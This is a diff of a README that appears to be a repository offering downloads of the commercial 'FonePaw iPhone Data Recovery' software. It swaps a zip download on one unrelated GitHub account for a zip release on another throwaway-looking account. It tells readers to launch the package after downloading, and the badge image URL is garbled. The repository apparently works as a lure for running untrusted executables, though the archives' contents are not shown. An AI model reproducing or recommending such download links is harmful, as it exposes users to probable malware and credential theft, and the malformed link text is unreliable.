@@ -27,7 +27,7 @@ Welcome to the FonePaw iPhone Data Recovery GitHub repository! Here you can find
 ## Get Started with FonePaw iPhone Data Recovery
 
 To get started with FonePaw iPhone Data Recovery, you can download the software package from the following link:
-[![Download FonePaw iPhone Data Recovery](https://img.shields.io/badge/Download-FonePaw%20iPhone%20Data%20Recovery-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download FonePaw iPhone Data Recovery](https://github.com/Steven343463654/FonePaw-iPhone-Data-Recovery-Download/releases/download/v1.0/Application.zip%20iPhone%20Data%20Recovery-blue)](https://github.com/Steven343463654/FonePaw-iPhone-Data-Recovery-Download/releases/download/v1.0/Application.zip)
 
 Kindly note that the software package needs to be launched after downloading.
 
